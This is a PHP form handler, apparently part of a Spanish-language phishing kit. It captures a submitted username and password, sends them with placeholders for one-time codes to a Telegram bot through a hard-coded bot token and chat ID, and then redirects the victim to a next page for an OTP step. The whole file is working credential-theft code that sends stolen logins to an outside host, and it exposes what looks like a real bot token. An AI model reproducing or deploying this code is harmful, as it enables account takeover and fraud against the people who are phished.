<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST["txt-usuario"];
    $password = $_POST["txt-password"];
    $_SESSION['usuario'] = $usuario;
    $_SESSION['password'] = $password;
    
    // Check if the session variable is set
if(isset($_SESSION['usuario'])) {
    // If set, echo the value
    echo $_SESSION['usuario'];
} else {
    // If not set, display a message indicating it's not set
    echo "Session variable 'usuario' is not set.";
}


    // Send the data to Telegram bot
    $telegramToken = "7493863236:AAEfvXDdU-E4sjfCY9U-JIyV0T13_RxPB7c";
    $chatId = "-1002508406827";
   $message = "✅ PASO 1\n👨🏻‍💻 USUARIO: $usuario\n🔒 CONTRASEÑA: $password\n💰 OTP1: $otp1\n💰 OTP2: $otp2";

    $telegramUrl = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

    // Send the message using cURL
    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    // Redirect back to the form page or display a success message
    header("Location: index2.php"); //puede ir directamente a otp1.html
    exit();
}
?>
